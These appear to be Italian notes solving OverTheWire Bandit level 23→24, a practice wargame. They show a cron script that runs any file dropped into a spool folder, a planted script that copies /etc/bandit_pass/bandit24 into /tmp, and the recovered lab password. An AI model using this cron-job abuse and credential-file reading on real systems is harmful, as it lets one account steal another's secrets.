# Comandi usati:
	ssh
	cd
	cat
	nano
	chmod
	echo
# Procedura:
	ssh bandit23@bandit.labs.overthewire.org -p 2220
	cd /etc/cron.d
	cat cronjob_bandit24
	return:
		@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
		* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
	cat /usr/bin/cronjob_bandit24.sh
	return:
		#!/bin/bash  
		  
		shopt -s nullglob  
		  
		myname=$(whoami)  
		  
		cd /var/spool/"$myname"/foo || exit    
		echo "Executing and deleting all scripts in /var/spool/$myname/foo:"  
		for i in * .*;  
		do  
		   if [ "$i" != "." ] && [ "$i" != ".." ];  
		   then  
		       echo "Handling $i"  
		       owner="$(stat --format "%U" "./$i")"  
		       if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then  
		           timeout -s 9 60 "./$i"  
		       fi  
		       rm -rf "./$i"  
		   fi  
		done
	
	cd /var/spool/bandit24/foo
	nano getpass.sh
		#!/bin/bash
		cat /etc/bandit_pass/bandit24 > /tmp/pass24.txt
	
	chmod 777 getpass.sh
	cd /tmp
	cat pass24.txt
	return:
		(password)
# Password sbloccata:
	hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv